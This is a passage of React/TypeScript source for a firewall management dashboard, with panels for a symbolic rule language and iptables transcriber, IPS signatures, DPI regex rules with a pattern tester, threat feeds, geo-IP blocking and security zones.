          <button onClick={()=>run(input)} style={{ background:"#00ff8811", border:"1px solid #00ff8833", color:"#00ff88", borderRadius:4, padding:"3px 10px", cursor:"pointer" }}><Play size={10}/></button>
        </div>
        {/* Transcriber */}
        <div style={{ marginTop:12, background:"#0a0a0a", border:"1px solid #cc44ff44", borderRadius:8, padding:14 }}>
          <div style={{ fontSize:11, color:"#cc44ff", fontFamily:"monospace", fontWeight:700, marginBottom:10, display:"flex", alignItems:"center", gap:6 }}>
            <Zap size={11}/> SYMSCRIPT™ TRANSCRIBER — Plain English / iptables → SymScript™
          </div>
          <div style={{ display:"flex", gap:8, marginBottom:8 }}>
            <input value={trInput} onChange={e=>setTrInput(e.target.value)} onKeyDown={e=>e.key==="Enter"&&handleTranscribe()} placeholder='"allow TCP port 443 inbound" or paste iptables rule...' style={{ flex:1, background:"#111", border:"1px solid #333", borderRadius:6, padding:"7px 10px", color:"#ccc", fontFamily:"monospace", fontSize:11, outline:"none" }}/>
            <button onClick={handleTranscribe} disabled={transcribe.isPending} style={{ background:"#cc44ff22", border:"1px solid #cc44ff44", color:"#cc44ff", borderRadius:6, padding:"7px 14px", cursor:"pointer", fontFamily:"monospace", fontSize:11 }}>
              {transcribe.isPending?"...":"Transcribe →"}
            </button>
          </div>
          {trResult&&(
            <div style={{ background:"#0d0d0d", borderRadius:6, padding:12, display:"flex", flexDirection:"column", gap:8 }}>
              <div style={{ display:"flex", alignItems:"center", gap:8 }}>
                <span style={{ fontSize:10, color:"#555" }}>SymScript™:</span>
                <span style={{ fontFamily:"monospace", fontSize:14, color:"#00ff88", fontWeight:700 }}>{trResult.symscript}</span>
                <CopyBtn text={trResult.symscript??""} />
                <span style={{ marginLeft:"auto", fontSize:10, color:"#444" }}>Confidence: {trResult.confidence}%</span>
              </div>
              <div style={{ fontSize:11, color:"#555" }}>{trResult.explanation}</div>
              {trResult.compiledIptables&&(
                <div style={{ fontFamily:"monospace", fontSize:10, color:"#44aaff", background:"#111", borderRadius:4, padding:6 }}>
                  {trResult.compiledIptables} <CopyBtn text={trResult.compiledIptables}/>
                </div>
              )}
              <div style={{ display:"flex", gap:8 }}>
                <button onClick={applyTranscribed} style={{ background:"#00ff8822", border:"1px solid #00ff8844", color:"#00ff88", borderRadius:6, padding:"5px 12px", cursor:"pointer", fontSize:11, fontFamily:"monospace" }}>✓ Apply to GhostOS™</button>
                <button onClick={()=>{setNewRule(trResult.symscript??"");}} style={{ background:"#44aaff22", border:"1px solid #44aaff44", color:"#44aaff", borderRadius:6, padding:"5px 12px", cursor:"pointer", fontSize:11, fontFamily:"monospace" }}>Edit in terminal</button>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Right panel */}
      <div style={{ display:"flex", flexDirection:"column", gap:12, overflow:"hidden" }}>
        <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:12, flex:1, overflow:"auto" }}>
          <div style={{ fontSize:10, color:"#444", textTransform:"uppercase", letterSpacing:1, marginBottom:8 }}>Active Rules ({rules?.total??0})</div>
          <div style={{ display:"flex", gap:6, marginBottom:8 }}>
            <input value={newRule} onChange={e=>setNewRule(e.target.value)} onKeyDown={e=>e.key==="Enter"&&run(`add ${newRule}`)} placeholder="⊕ 443::ΩT ← @ANY ≫5" style={{ flex:1, background:"#111", border:"1px solid #333", borderRadius:4, padding:"5px 8px", color:"#00ff88", fontFamily:"monospace", fontSize:10, outline:"none" }}/>
            <button onClick={()=>run(`add ${newRule}`)} style={{ background:"#00ff8811", border:"1px solid #00ff8833", color:"#00ff88", borderRadius:4, padding:"0 8px", cursor:"pointer" }}><Plus size={11}/></button>
          </div>
          {(rules?.rules??[]).map(rule=>(
            <div key={rule.id} style={{ background:"#111", borderRadius:6, padding:"8px 10px", marginBottom:6, borderLeft:`3px solid ${rule.enabled?"#00ff88":"#222"}` }}>
              <div style={{ fontFamily:"monospace", fontSize:11, color:rule.enabled?"#00ff88":"#444", wordBreak:"break-all" }}>{rule.symbolicRule}</div>
              {rule.description&&<div style={{ fontSize:10, color:"#333", marginTop:2 }}>{rule.description}</div>}
              <div style={{ display:"flex", gap:4, marginTop:6 }}>
                <button onClick={()=>upd.mutate({id:rule.id,data:{enabled:!rule.enabled}},{onSuccess:()=>refetch()})} style={{ background:"none", border:"1px solid #333", borderRadius:3, padding:"2px 6px", cursor:"pointer", color:rule.enabled?"#00ff88":"#444", fontSize:9, fontFamily:"monospace" }}>{rule.enabled?"ON":"OFF"}</button>
                <button onClick={()=>del.mutate({id:rule.id},{onSuccess:()=>refetch()})} style={{ background:"none", border:"1px solid #ff444433", borderRadius:3, padding:"2px 5px", cursor:"pointer", color:"#ff4444" }}><Trash2 size={8}/></button>
                <CopyBtn text={rule.symbolicRule}/>
              </div>
            </div>
          ))}
        </div>
        {/* Symbol quick-ref */}
        <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:12 }}>
          <div style={{ fontSize:10, color:"#333", textTransform:"uppercase", marginBottom:8 }}>SymScript™ Quick Reference</div>
          {[["⊕","PERMIT","#00ff88"],["⊘","DROP","#ff4444"],["⊗","REJECT","#ff6600"],["⊛","RATE-LIMIT","#ffaa00"],["⊜","INSPECT","#44aaff"],["⊝","LOG+ALLOW","#888"],["⊞","LOG+BLOCK","#cc44ff"]].map(([sym,lbl,c])=>(
            <div key={sym} style={{ display:"flex", alignItems:"center", gap:8, marginBottom:3 }}>
              <span style={{ fontSize:13, color:c, width:18 }}>{sym}</span>
              <span style={{ fontSize:10, color:"#444", fontFamily:"monospace" }}>{lbl}</span>
            </div>
          ))}
          <div style={{ borderTop:"1px solid #1a1a1a", marginTop:8, paddingTop:8, display:"flex", flexWrap:"wrap", gap:4 }}>
            {["ΩT","ΩU","ΩI","Ω*","←","→","↔","@ANY","@GEO:XX","≫N","⚡N/min"].map(tok=>(
              <button key={tok} onClick={()=>setNewRule(r=>r+tok)} style={{ background:"#111", border:"1px solid #222", borderRadius:3, padding:"2px 6px", cursor:"pointer", color:"#666", fontFamily:"monospace", fontSize:10 }}>{tok}</button>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}

// ── IPS Engine ────────────────────────────────────────────────────────────
function IpsTab() {
  const { data, refetch } = useListIpsSignatures();
  const tog = useToggleIpsSignature();
  const del = useDeleteIpsSignature();
  const bulk = useBulkToggleIpsCategory();
  const [search, setSearch] = useState("");
  const [selCat, setSelCat] = useState("all");
  const sigs = data?.signatures??[];
  const cats = Object.keys(data?.categoryCounts??{});
  const filtered = sigs.filter(s=>(selCat==="all"||s.category===selCat)&&(!search||s.name.toLowerCase().includes(search.toLowerCase())||s.sid.toLowerCase().includes(search.toLowerCase())));
  return (
    <div style={{ display:"flex", flexDirection:"column", gap:12 }}>
      <div style={{ display:"flex", alignItems:"center", gap:10, flexWrap:"wrap" }}>
        <div style={{ fontSize:13, fontWeight:700, color:"#ff9900" }}>IPS Engine — {data?.enabledCount??0}/{data?.total??0} Signatures Active</div>
        <div style={{ position:"relative", flex:1, minWidth:200 }}>
          <Search size={11} style={{ position:"absolute", left:9, top:"50%", transform:"translateY(-50%)", color:"#444" }}/>
          <input value={search} onChange={e=>setSearch(e.target.value)} placeholder="Search signatures, SIDs, CVEs..." style={{ width:"100%", paddingLeft:28, background:"#111", border:"1px solid #333", borderRadius:6, padding:"7px 10px 7px 26px", color:"#ccc", fontSize:12, outline:"none", boxSizing:"border-box" }}/>
        </div>
        <button onClick={()=>bulk.mutate({data:{category:selCat==="all"?"web-attacks":selCat,enabled:true}},{onSuccess:()=>refetch()})} style={{ background:"#00ff8811", border:"1px solid #00ff8833", color:"#00ff88", borderRadius:6, padding:"7px 12px", cursor:"pointer", fontSize:11, fontFamily:"monospace" }}>Enable All</button>
        <button onClick={()=>bulk.mutate({data:{category:selCat==="all"?"web-attacks":selCat,enabled:false}},{onSuccess:()=>refetch()})} style={{ background:"#ff444411", border:"1px solid #ff444433", color:"#ff4444", borderRadius:6, padding:"7px 12px", cursor:"pointer", fontSize:11, fontFamily:"monospace" }}>Disable All</button>
      </div>
      <div style={{ display:"flex", gap:6, flexWrap:"wrap" }}>
        {["all",...cats].map(cat=>(
          <button key={cat} onClick={()=>setSelCat(cat)} style={{ background:selCat===cat?"#ff990022":"#111", border:`1px solid ${selCat===cat?"#ff9900":"#333"}`, color:selCat===cat?"#ff9900":"#555", borderRadius:6, padding:"5px 11px", cursor:"pointer", fontSize:10, fontFamily:"monospace", textTransform:"uppercase" }}>
            {cat==="all"?`All (${sigs.length})`:`${cat} (${(data?.categoryCounts as Record<string,{total:number}>)?.[cat]?.total??0})`}
          </button>
        ))}
      </div>
      <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, overflow:"auto", maxHeight:460 }}>
        <table style={{ width:"100%", borderCollapse:"collapse", fontSize:12 }}>
          <thead><tr style={{ borderBottom:"1px solid #1a1a1a" }}>{["SID","Signature Name","Category","Severity","CVE","Action","Status",""].map(h=><th key={h} style={{ padding:"9px 12px", textAlign:"left", color:"#444", fontSize:10, textTransform:"uppercase", letterSpacing:1 }}>{h}</th>)}</tr></thead>
          <tbody>
            {filtered.map(sig=>(
              <tr key={sig.id} style={{ borderBottom:"1px solid #0d0d0d", opacity:sig.enabled?1:0.45 }}>
                <td style={{ padding:"7px 12px", fontFamily:"monospace", color:"#444", fontSize:10 }}>{sig.sid}</td>
                <td style={{ padding:"7px 12px", color:"#bbb", maxWidth:240 }}>
                  <div>{sig.name}</div>
                  {sig.description&&<div style={{ fontSize:10, color:"#333", marginTop:1 }}>{sig.description}</div>}
                </td>
                <td style={{ padding:"7px 12px" }}><Bdg label={sig.category} color="#ff9900" sm/></td>
                <td style={{ padding:"7px 12px" }}><Bdg label={sig.severity} color={SEV_COLOR[sig.severity]??"#888"} sm/></td>
                <td style={{ padding:"7px 12px", fontFamily:"monospace", fontSize:10, color:"#444" }}>{sig.cveId ?? "—"}</td>
                <td style={{ padding:"7px 12px" }}><Bdg label={sig.action} color={sig.action==="drop"?"#ff4444":"#ffaa00"} sm/></td>
                <td style={{ padding:"7px 12px" }}>
                  <button onClick={()=>tog.mutate({id:sig.id,data:{enabled:!sig.enabled}},{onSuccess:()=>refetch()})} style={{ background:sig.enabled?"#00ff8822":"#22222222", border:`1px solid ${sig.enabled?"#00ff8844":"#333"}`, color:sig.enabled?"#00ff88":"#444", borderRadius:4, padding:"3px 10px", cursor:"pointer", fontSize:10, fontFamily:"monospace" }}>{sig.enabled?"ON":"OFF"}</button>
                </td>
                <td style={{ padding:"7px 12px" }}>
                  <button onClick={()=>del.mutate({id:sig.id},{onSuccess:()=>refetch()})} style={{ background:"none", border:"1px solid #ff444433", borderRadius:3, padding:"2px 5px", cursor:"pointer", color:"#ff4444" }}><Trash2 size={8}/></button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  );
}

// ── DPI Engine ────────────────────────────────────────────────────────────
function DpiTab() {
  const { data, refetch } = useListDpiRules();
  const create = useCreateDpiRule();
  const del = useDeleteDpiRule();
  const upd = useUpdateDpiRule();
  const testPat = useTestDpiPattern();
  const [form, setForm] = useState({ name:"", pattern:"", patternType:"url", action:"block", description:"" });
  const [testInput, setTestInput] = useState("");
  const [testResult, setTestResult] = useState<{matched?:boolean}|null>(null);
  return (
    <div style={{ display:"flex", gap:16 }}>
      <div style={{ flex:1, display:"flex", flexDirection:"column", gap:12 }}>
        <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, overflow:"auto", maxHeight:360 }}>
          <div style={{ padding:"10px 14px", borderBottom:"1px solid #1a1a1a", fontSize:11, color:"#44aaff", fontWeight:700 }}>DPI Rules — {data?.enabledCount}/{data?.total} Active</div>
          <table style={{ width:"100%", borderCollapse:"collapse", fontSize:11 }}>
            <thead><tr style={{ borderBottom:"1px solid #111" }}>{["Name","Pattern","Type","Action","Hits",""].map(h=><th key={h} style={{ padding:"8px 12px", textAlign:"left", color:"#444", fontSize:10, textTransform:"uppercase" }}>{h}</th>)}</tr></thead>
            <tbody>{(data?.rules??[]).map(r=>(
              <tr key={r.id} style={{ borderBottom:"1px solid #0d0d0d", opacity:r.enabled?1:0.4 }}>
                <td style={{ padding:"7px 12px", color:"#bbb" }}>{r.name}</td>
                <td style={{ padding:"7px 12px", fontFamily:"monospace", fontSize:10, color:"#666", maxWidth:180, overflow:"hidden", textOverflow:"ellipsis", whiteSpace:"nowrap" }}>{r.pattern}</td>
                <td style={{ padding:"7px 12px" }}><Bdg label={r.patternType} color="#44aaff" sm/></td>
                <td style={{ padding:"7px 12px" }}><Bdg label={r.action} color={r.action==="block"?"#ff4444":"#ffaa00"} sm/></td>
                <td style={{ padding:"7px 12px", fontFamily:"monospace", color:"#ff9900" }}>{r.hitCount}</td>
                <td style={{ padding:"7px 12px", display:"flex", gap:6 }}>
                  <button onClick={()=>upd.mutate({id:r.id,data:{enabled:!r.enabled}},{onSuccess:()=>refetch()})} style={{ background:r.enabled?"#00ff8811":"#22222222", border:`1px solid ${r.enabled?"#00ff8833":"#333"}`, color:r.enabled?"#00ff88":"#444", borderRadius:3, padding:"2px 8px", cursor:"pointer", fontSize:9, fontFamily:"monospace" }}>{r.enabled?"ON":"OFF"}</button>
                  <button onClick={()=>del.mutate({id:r.id},{onSuccess:()=>refetch()})} style={{ background:"none", border:"1px solid #ff444433", borderRadius:3, padding:"2px 5px", cursor:"pointer", color:"#ff4444" }}><Trash2 size={8}/></button>
                </td>
              </tr>
            ))}</tbody>
          </table>
        </div>
        <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14 }}>
          <div style={{ fontSize:10, color:"#444", textTransform:"uppercase", letterSpacing:1, marginBottom:10 }}>Pattern Tester</div>
          <div style={{ display:"flex", gap:8, marginBottom:8 }}>
            <input value={form.pattern} onChange={e=>setForm(f=>({...f,pattern:e.target.value}))} placeholder="Regex pattern (e.g. UNION.+SELECT)..." style={{ flex:1, background:"#111", border:"1px solid #333", borderRadius:6, padding:"7px 10px", color:"#ccc", fontFamily:"monospace", fontSize:11, outline:"none" }}/>
            <select value={form.patternType} onChange={e=>setForm(f=>({...f,patternType:e.target.value}))} style={{ background:"#111", border:"1px solid #333", borderRadius:6, padding:"7px", color:"#ccc", fontSize:11, cursor:"pointer" }}>
              {["url","header","body","user-agent","host","method"].map(t=><option key={t}>{t}</option>)}
            </select>
          </div>
          <div style={{ display:"flex", gap:8 }}>
            <input value={testInput} onChange={e=>setTestInput(e.target.value)} placeholder="Test string..." style={{ flex:1, background:"#111", border:"1px solid #333", borderRadius:6, padding:"7px 10px", color:"#ccc", fontSize:11, outline:"none" }}/>
            <button onClick={()=>testPat.mutate({data:{pattern:form.pattern,patternType:form.patternType,testInput}},{onSuccess:(r)=>setTestResult(r as {matched?:boolean})})} style={{ background:"#44aaff22", border:"1px solid #44aaff44", color:"#44aaff", borderRadius:6, padding:"7px 14px", cursor:"pointer", fontSize:11 }}>Test</button>
          </div>
          {testResult&&<div style={{ marginTop:8, padding:"7px 12px", borderRadius:6, background:testResult.matched?"#ff444422":"#00ff8822", color:testResult.matched?"#ff4444":"#00ff88", fontFamily:"monospace", fontSize:12 }}>{testResult.matched?"✗ BLOCKED — Pattern matched":"✓ ALLOWED — No match"}</div>}
        </div>
      </div>
      <div style={{ width:270, background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14, display:"flex", flexDirection:"column", gap:10 }}>
        <div style={{ fontSize:10, color:"#444", textTransform:"uppercase", letterSpacing:1 }}>Add DPI Rule</div>
        {[{l:"Name",k:"name",ph:"SQL Injection Block"},{l:"Pattern (regex)",k:"pattern",ph:"UNION.+SELECT"},{l:"Description",k:"description",ph:"Optional..."}].map(f=>(
          <div key={f.k}>
            <div style={{ fontSize:10, color:"#444", marginBottom:3 }}>{f.l}</div>
            <input value={form[f.k as keyof typeof form]} onChange={e=>setForm(p=>({...p,[f.k]:e.target.value}))} placeholder={f.ph} style={{ width:"100%", background:"#111", border:"1px solid #333", borderRadius:6, padding:"6px 10px", color:"#ccc", fontFamily:"monospace", fontSize:11, outline:"none", boxSizing:"border-box" }}/>
          </div>
        ))}
        {[{l:"Type",k:"patternType",opts:["url","header","body","user-agent","host","method"]},{l:"Action",k:"action",opts:["block","alert","log"]}].map(f=>(
          <div key={f.k}>
            <div style={{ fontSize:10, color:"#444", marginBottom:3 }}>{f.l}</div>
            <select value={form[f.k as keyof typeof form]} onChange={e=>setForm(p=>({...p,[f.k]:e.target.value}))} style={{ width:"100%", background:"#111", border:"1px solid #333", borderRadius:6, padding:"6px", color:"#ccc", fontSize:11, cursor:"pointer" }}>{f.opts.map(o=><option key={o}>{o}</option>)}</select>
          </div>
        ))}
        <button onClick={()=>create.mutate({data:{name:form.name,pattern:form.pattern,patternType:form.patternType as "url"|"header"|"body"|"user-agent"|"host"|"method",action:form.action as "block"|"alert"|"log",description:form.description}},{onSuccess:()=>{refetch();setForm({name:"",pattern:"",patternType:"url",action:"block",description:""});}})} disabled={!form.name||!form.pattern} style={{ background:"#44aaff22", border:"1px solid #44aaff44", color:"#44aaff", borderRadius:6, padding:"8px", cursor:"pointer", fontSize:11, fontFamily:"monospace" }}>
          <Plus size={11} style={{ marginRight:5, verticalAlign:"middle" }}/>Add Rule
        </button>
      </div>
    </div>
  );
}

// ── Threat Intel ──────────────────────────────────────────────────────────
const HRC=[{code:"CN",name:"China"},{code:"RU",name:"Russia"},{code:"KP",name:"North Korea"},{code:"IR",name:"Iran"},{code:"SY",name:"Syria"},{code:"BY",name:"Belarus"},{code:"VE",name:"Venezuela"},{code:"CU",name:"Cuba"},{code:"MM",name:"Myanmar"},{code:"SD",name:"Sudan"},{code:"YE",name:"Yemen"},{code:"LY",name:"Libya"}];

function ThreatTab() {
  const { data: geo, refetch: rGeo } = useListGeoBlocks();
  const { data: feeds, refetch: rFeeds } = useListThreatFeeds();
  const { data: profiles } = useListThreatProfiles();
  const addGeo = useAddGeoBlock(); const rmGeo = useRemoveGeoBlock(); const updGeo = useUpdateGeoBlock();
  const sync = useSyncThreatFeed(); const updFeed = useUpdateThreatFeed();
  const apply = useApplyThreatProfile();
  const [applying, setApplying] = useState<string|null>(null);
  const [gi, setGi] = useState({ countryCode:"", countryName:"" });

  return (
    <div style={{ display:"flex", flexDirection:"column", gap:16 }}>
      {/* Threat Profiles */}
      <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:16 }}>
        <div style={{ fontSize:12, color:"#ffaa00", fontWeight:700, marginBottom:14 }}>One-Click Threat Profiles — Palo Alto · Fortinet · Check Point + ProxhqVPN Presets</div>
        <div style={{ display:"grid", gridTemplateColumns:"repeat(3,1fr)", gap:10 }}>
          {(profiles?.profiles??[]).map(p=>(
            <div key={p.id} style={{ background:"#111", border:`1px solid ${p.color}33`, borderRadius:8, padding:12 }}>
              <div style={{ fontSize:12, fontWeight:700, color:p.color, marginBottom:3 }}>{p.name}</div>
              <div style={{ fontSize:9, color:"#555", marginBottom:6 }}>{p.vendor}</div>
              <div style={{ fontSize:10, color:"#444", marginBottom:8, lineHeight:1.5 }}>{p.description}</div>
              {(p.actions??[]).slice(0,3).map((a:string,i:number)=><div key={i} style={{ fontSize:9, color:"#444", display:"flex", gap:4, marginBottom:2 }}><span style={{color:p.color}}>▸</span>{a}</div>)}
              <div style={{ marginTop:8, marginBottom:8 }}><Bdg label={p.severity} color={p.color} sm/></div>
              <button onClick={async()=>{setApplying(p.id);try{await apply.mutateAsync({id:p.id});}catch{}setApplying(null);}} disabled={applying===p.id} style={{ width:"100%", background:p.color+"22", border:`1px solid ${p.color}44`, color:p.color, borderRadius:6, padding:"6px", cursor:"pointer", fontSize:10, fontFamily:"monospace" }}>
                {applying===p.id?"Applying...":"Apply Profile"}
              </button>
            </div>
          ))}
        </div>
      </div>
      <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:16 }}>
        {/* Threat Feeds */}
        <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14 }}>
          <div style={{ fontSize:11, color:"#ff9900", fontWeight:700, marginBottom:10, display:"flex", alignItems:"center", gap:6 }}><Rss size={12}/>Threat Intelligence Feeds</div>
          {(feeds?.feeds??[]).map(f=>(
            <div key={f.id} style={{ background:"#111", borderRadius:6, padding:10, marginBottom:8 }}>
              <div style={{ display:"flex", alignItems:"center", justifyContent:"space-between", marginBottom:3 }}>
                <span style={{ fontSize:12, color:"#bbb" }}>{f.name}</span>
                <Bdg label={f.status} color={f.status==="synced"?"#00ff88":f.status==="error"?"#ff4444":"#888"} sm/>
              </div>
              <div style={{ fontSize:10, color:"#444", marginBottom:6 }}>{f.entryCount} entries · {f.lastSyncedAt?new Date(f.lastSyncedAt).toLocaleString():"Never synced"}</div>
              <div style={{ display:"flex", gap:6 }}>
                <button onClick={()=>updFeed.mutate({id:f.id,data:{enabled:!f.enabled}},{onSuccess:()=>rFeeds()})} style={{ background:f.enabled?"#00ff8811":"#22222222", border:`1px solid ${f.enabled?"#00ff8833":"#333"}`, color:f.enabled?"#00ff88":"#444", borderRadius:3, padding:"2px 8px", cursor:"pointer", fontSize:9, fontFamily:"monospace" }}>{f.enabled?"ON":"OFF"}</button>
                <button onClick={()=>sync.mutate({id:f.id},{onSuccess:()=>rFeeds()})} style={{ background:"#44aaff11", border:"1px solid #44aaff33", color:"#44aaff", borderRadius:3, padding:"2px 8px", cursor:"pointer", fontSize:9 }}><RefreshCw size={9}/></button>
              </div>
            </div>
          ))}
        </div>
        {/* Geo-IP */}
        <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14 }}>
          <div style={{ fontSize:11, color:"#4488ff", fontWeight:700, marginBottom:10, display:"flex", alignItems:"center", gap:6 }}><Globe2 size={12}/>Geo-IP Blocking ({geo?.enabledCount}/{geo?.total})</div>
          <div style={{ display:"flex", gap:6, marginBottom:8 }}>
            <input value={gi.countryCode} onChange={e=>setGi(g=>({...g,countryCode:e.target.value.toUpperCase().slice(0,2)}))} placeholder="XX" style={{ width:44, background:"#111", border:"1px solid #333", borderRadius:6, padding:"6px 6px", color:"#ccc", fontFamily:"monospace", fontSize:11, textAlign:"center", outline:"none" }}/>
            <input value={gi.countryName} onChange={e=>setGi(g=>({...g,countryName:e.target.value}))} placeholder="Country name..." style={{ flex:1, background:"#111", border:"1px solid #333", borderRadius:6, padding:"6px 8px", color:"#ccc", fontSize:11, outline:"none" }}/>
            <button onClick={()=>addGeo.mutate({data:{countryCode:gi.countryCode,countryName:gi.countryName}},{onSuccess:()=>{rGeo();setGi({countryCode:"",countryName:""}); }})} style={{ background:"#4488ff22", border:"1px solid #4488ff44", color:"#4488ff", borderRadius:6, padding:"6px 8px", cursor:"pointer" }}><Plus size={11}/></button>
          </div>
          <div style={{ display:"flex", flexWrap:"wrap", gap:4, marginBottom:8 }}>
            {HRC.filter(c=>!(geo?.blocks??[]).find(b=>b.countryCode===c.code)).slice(0,8).map(c=>(
              <button key={c.code} onClick={()=>addGeo.mutate({data:{countryCode:c.code,countryName:c.name}},{onSuccess:()=>rGeo()})} style={{ background:"#ff444411", border:"1px solid #ff444433", color:"#ff4444", borderRadius:3, padding:"2px 7px", cursor:"pointer", fontSize:9, fontFamily:"monospace" }}>+{c.code}</button>
            ))}
          </div>
          <div style={{ maxHeight:240, overflow:"auto", display:"flex", flexDirection:"column", gap:5 }}>
            {(geo?.blocks??[]).map(b=>(
              <div key={b.id} style={{ display:"flex", alignItems:"center", gap:8, background:"#111", borderRadius:5, padding:"6px 10px" }}>
                <span style={{ fontFamily:"monospace", fontSize:11, color:"#666", width:26 }}>{b.countryCode}</span>
                <span style={{ flex:1, fontSize:11, color:"#bbb" }}>{b.countryName}</span>
                <span style={{ fontSize:10, color:"#ff9900", fontFamily:"monospace" }}>{b.hitCount}</span>
                <button onClick={()=>updGeo.mutate({id:b.id,data:{enabled:!b.enabled}},{onSuccess:()=>rGeo()})} style={{ background:b.enabled?"#ff444422":"#22222222", border:`1px solid ${b.enabled?"#ff444444":"#333"}`, color:b.enabled?"#ff4444":"#444", borderRadius:3, padding:"2px 8px", cursor:"pointer", fontSize:9, fontFamily:"monospace" }}>{b.enabled?"BLOCKED":"OFF"}</button>
                <button onClick={()=>rmGeo.mutate({id:b.id},{onSuccess:()=>rGeo()})} style={{ background:"none", border:"none", color:"#333", cursor:"pointer", padding:0 }}><Trash2 size={9}/></button>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}

// ── Zones ─────────────────────────────────────────────────────────────────
function ZonesTab() {
  const { data, refetch } = useListFirewallZones();
  const create = useCreateFirewallZone(); const del = useDeleteFirewallZone(); const upd = useUpdateFirewallZone();
  const [form, setForm] = useState({ name:"", trustLevel:"untrusted", interfaces:"", description:"" });
  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 270px", gap:16 }}>
      <div>
        <div style={{ fontSize:12, color:"#cc44ff", fontWeight:700, marginBottom:12 }}>Security Zones — {data?.total??0} Configured</div>
        <div style={{ display:"grid", gridTemplateColumns:"repeat(2,1fr)", gap:12 }}>
          {(data?.zones??[]).map(z=>(
            <div key={z.id} style={{ background:"#0a0a0a", border:`1px solid ${z.color}33`, borderRadius:8, padding:14 }}>
              <div style={{ display:"flex", alignItems:"center", gap:8, marginBottom:6 }}>
                <div style={{ width:8, height:8, borderRadius:"50%", background:z.color }}/>
                <span style={{ fontWeight:700, fontSize:13, color:z.color }}>{z.name}</span>
                <Bdg label={z.trustLevel} color={TRUST_COLOR[z.trustLevel]??z.color} sm/>
              </div>
              {z.description&&<div style={{ fontSize:10, color:"#444", marginBottom:8 }}>{z.description}</div>}
              {z.interfaces&&<div style={{ fontSize:10, color:"#333", fontFamily:"monospace", marginBottom:8 }}>iface: {z.interfaces}</div>}
              <div style={{ display:"flex", gap:10, marginBottom:8 }}>
                <div><div style={{ fontSize:9, color:"#444" }}>Inbound</div><Bdg label={z.inboundPolicy} color={z.inboundPolicy==="allow"?"#00ff88":"#ff4444"} sm/></div>
                <div><div style={{ fontSize:9, color:"#444" }}>Outbound</div><Bdg label={z.outboundPolicy} color={z.outboundPolicy==="allow"?"#00ff88":"#ff4444"} sm/></div>
              </div>
              <div style={{ display:"flex", gap:6 }}>
                <button onClick={()=>upd.mutate({id:z.id,data:{inboundPolicy:z.inboundPolicy==="allow"?"deny":"allow"}},{onSuccess:()=>refetch()})} style={{ flex:1, background:"#111", border:"1px solid #333", color:"#666", borderRadius:4, padding:"4px 8px", cursor:"pointer", fontSize:10 }}>Toggle Inbound</button>
                <button onClick={()=>del.mutate({id:z.id},{onSuccess:()=>refetch()})} style={{ background:"none", border:"1px solid #ff444433", borderRadius:4, padding:"4px 7px", cursor:"pointer", color:"#ff4444" }}><Trash2 size={9}/></button>
              </div>
            </div>
          ))}
        </div>
      </div>
      <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14, display:"flex", flexDirection:"column", gap:10, alignSelf:"start" }}>
        <div style={{ fontSize:10, color:"#444", textTransform:"uppercase", letterSpacing:1 }}>Add Zone</div>
        {[{l:"Name",k:"name",ph:"WireGuard Peers"},{l:"Interfaces",k:"interfaces",ph:"wg0,wg1"},{l:"Description",k:"description",ph:"Optional..."}].map(f=>(
          <div key={f.k}>
            <div style={{ fontSize:10, color:"#444", marginBottom:3 }}>{f.l}</div>
            <input value={form[f.k as keyof typeof form]} onChange={e=>setForm(p=>({...p,[f.k]:e.target.value}))} placeholder={f.ph} style={{ width:"100%", background:"#111", border:"1px solid #333", borderRadius:6, padding:"6px 10px", color:"#ccc", fontSize:11, outline:"none", boxSizing:"border-box" }}/>
          </div>
        ))}
        <div>
          <div style={{ fontSize:10, color:"#444", marginBottom:3 }}>Trust Level</div>
          <select value={form.trustLevel} onChange={e=>setForm(p=>({...p,trustLevel:e.target.value}))} style={{ width:"100%", background:"#111", border:"1px solid #333", borderRadius:6, padding:"6px", color:"#ccc", fontSize:11, cursor:"pointer" }}>
            {["trusted","untrusted","dmz","management"].map(t=><option key={t}>{t}</option>)}
          </select>
        </div>
        <button onClick={()=>create.mutate({data:{name:form.name,trustLevel:form.trustLevel as "trusted"|"untrusted"|"dmz"|"management",interfaces:form.interfaces,description:form.description}},{onSuccess:()=>{refetch();setForm({name:"",trustLevel:"untrusted",interfaces:"",description:""});}})} disabled={!form.name} style={{ background:"#cc44ff22", border:"1px solid #cc44ff44", color:"#cc44ff", borderRadius:6, padding:"8px", cursor:"pointer", fontSize:11, fontFamily:"monospace" }}>
          <Plus size={11} style={{ marginRight:5, verticalAlign:"middle" }}/>Add Zone
        </button>
      </div>
    </div>
  );
}

// ── Rules ─────────────────────────────────────────────────────────────────
function RulesTab() {
  const { data: rData, refetch: rR } = useListFirewallRules();
  const { data: fData, refetch: rF } = useListFqdnRules();
  const { data: conflicts, mutate: chk } = useCheckRuleConflicts();
  const cR = useCreateFirewallRule(); const dR = useDeleteFirewallRule(); const uR = useUpdateFirewallRule();
  const cF = useCreateFqdnRule(); const dF = useDeleteFqdnRule(); const uF = useUpdateFqdnRule();
  const [sec, setSec] = useState<"rules"|"fqdn">("rules");
  const [rf, setRf] = useState({ name:"", direction:"inbound", action:"deny", protocol:"tcp", destPort:"" });
  const [ff, setFf] = useState({ domain:"", action:"block", direction:"both" });
  return (
    <div style={{ display:"flex", flexDirection:"column", gap:12 }}>
      <div style={{ display:"flex", gap:8, alignItems:"center" }}>
        {(["rules","fqdn"] as const).map(s=>(
